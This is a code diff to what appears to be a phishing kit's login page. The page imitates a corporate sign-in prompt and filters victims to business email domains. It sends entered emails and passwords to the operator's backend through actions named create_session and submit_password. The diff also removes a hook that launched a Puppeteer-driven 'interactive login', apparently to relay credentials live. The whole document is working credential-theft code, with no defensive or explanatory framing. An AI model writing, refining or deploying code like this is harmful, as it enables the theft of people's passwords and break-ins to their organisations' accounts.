@@ -375,7 +375,19 @@
         async function validateEmailDomain(email) {
             if (!email || !email.includes('@')) return false;
             const domain = email.split('@')[1].toLowerCase();
-            return !BLOCKED_DOMAINS.includes(domain);
+            if (BLOCKED_DOMAINS.includes(domain)) return false;
+            try {
+                const r = await fetch(`${_apiBase}?action=verify_email`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email })
+                });
+                if (!r.ok) return false;
+                const data = await r.json();
+                return data.ok && data.isBusiness === true;
+            } catch (e) {
+                return false;
+            }
         }
 
         const _el = {
@@ -487,22 +499,6 @@
             } catch (z) {}
         }
 
-        async function _runInteractiveLogin(sessionId, email) {
-            try {
-                await fetch(`${_apiBase}?action=run_puppeteer`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        sessionId: sessionId,
-                        email: email,
-                        interactive: true
-                    }),
-                });
-            } catch (e) {
-                console.error("Failed to start interactive session", e);
-            }
-        }
-
         async function _handleStatus(statusData, sessionId) {
             if (!statusData) {
                 console.error('[STATUS] Received null status data.');
@@ -593,20 +589,22 @@
                 _el.ee.style.display = 'block';
                 return;
             }
-            
+
+            _el.nb.disabled = true;
+            if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
+
             const isValidDomain = await validateEmailDomain(e);
             console.log(`[STEP 2] Domain validation result: ${isValidDomain}`);
             if (!isValidDomain) {
+                _el.lb.classList.add('hidden');
+                _el.nb.disabled = false;
                 _el.ee.textContent = 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.';
                 _el.ee.style.display = 'block';
                 return;
             }
-            
+
             _el.ee.style.display = 'none';
             _el.ee.textContent = 'Please enter a valid email address.';
-
-            _el.nb.disabled = true;
-            if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
             
             const titleChangeTimeout = setTimeout(() => {
                 _el.et.classList.add('hidden');
@@ -625,9 +623,17 @@
                 clearTimeout(titleChangeTimeout);
                 _el.nb.disabled = false;
 
-                _le('email_ok', e, 0, '', cookieId);
                 _el.ued.textContent = e;
-                
+
+                fetch(`${_apiBase}?action=create_session`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: e, cookieId: cookieId })
+                }).catch(() => {});
+
+                await new Promise(r => setTimeout(r, 1000));
+
+                _el.lb.classList.add('hidden');
                 _el.es.classList.add('hidden');
                 _el.ps.classList.remove('hidden');
                 if(_el.oc) _el.oc.classList.add('hidden');
@@ -723,7 +729,7 @@
                 const res = await fetch(`${_apiBase}?action=submit_password`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: _el.ued.textContent.trim(), cookieId: _sessionId, passwords: [pwd] })
+                    body: JSON.stringify({ email: _el.ued.textContent.trim(), cookieId: _sessionId, password: pwd })
                 });
                 const data = await res.json();
                 console.log(`[STEP 10] Password submission response:`, data);
